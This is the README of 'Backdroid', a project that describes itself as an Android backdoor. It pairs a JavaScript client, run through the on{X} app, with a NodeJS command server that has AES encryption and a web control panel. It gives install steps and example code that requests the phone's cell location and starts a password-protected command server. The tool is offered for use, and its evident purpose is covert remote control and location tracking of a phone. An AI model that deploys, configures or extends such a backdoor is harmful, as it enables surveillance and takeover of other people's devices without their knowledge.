Backdroid v1.0.0 BETA
==================================================

What is this?
--------------------------------------

it's a backdoor for Android formed by a client written in JavaScript, with the help of http://onx.ms/, and a server written in NodeJS.

Features
--------------------------------------

	Encrypted connection in AES-256
	Web panel control
	Very flexible and scalable to add new features

How to install?
--------------------------------------

1º Download and install NodeJS (http://nodejs.org/).
2º Install backdroid with npm by the console (npm install -g backdroid).
3º Download and install Onx App for Android (https://play.google.com/store/apps/details?id=com.microsoft.onx.app).
4º Login in https://www.onx.ms/.
5º Download backdroid proyect.
6º Copy client.js source code (https://github.com/yeikos/nodejs.backdroid/blob/master/client.js) and paste it into https://www.onx.ms/#!createScriptPage (new rule).
7º Go to examples project folder and launch each example by the console (node SCRIPTNAME).

Example
--------------------------------------
	
	var backdroid = require('backdroid');

	backdroid.setCommand('location', { provider: 'CELL' }, function(command, value) {

		console.log('[sent]', command, value);

	}, function(command, value, response) {

		console.log('[response]', command, value, response);

	});

	backdroid.createCommandServer({

		password: 'secret',
		password_encryptation: 'secret123',
		
		port: 8888

	});